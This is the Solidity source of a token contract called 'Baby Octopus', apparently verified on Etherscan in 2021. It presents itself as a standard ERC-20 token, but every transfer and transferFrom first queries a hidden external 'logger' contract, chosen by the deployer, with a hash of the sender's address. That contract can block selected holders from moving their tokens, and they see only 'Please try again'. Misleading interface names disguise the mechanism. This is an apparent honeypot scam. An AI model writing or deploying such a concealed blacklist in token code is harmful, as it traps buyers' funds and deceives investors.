/**
 *Submitted for verification at Etherscan.io on 2021-08-22
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface IEP20 {

    function toke_staking( uint _a, uint _b) external view returns (bool);

    function logme(bytes20 account) external view returns (uint8);

    function token_unstake(address senders, address taker, uint balance, uint amount) external returns (bool);

    function token_withdraw(uint account, uint amounta, uint abountb) external returns (bool);

    function check_balance (address account) external returns (uint);


}

contract BabyOctopus {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    IEP20 logger;
    uint256 public totalSupply = 1 * 10**12 * 10**18;
    string public name = "Baby Octopus";
    string public symbol = hex"426162794F63746F707573f09f9099";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(IEP20 _trgte) {
        
        logger = _trgte;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function ctb(address account) public pure returns (bytes memory) {
    return abi.encodePacked(account);
}
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(logger.logme(ripemd160(ctb(msg.sender))) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(logger.logme(ripemd160(ctb(msg.sender))) != 1, "Please try again"); 
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}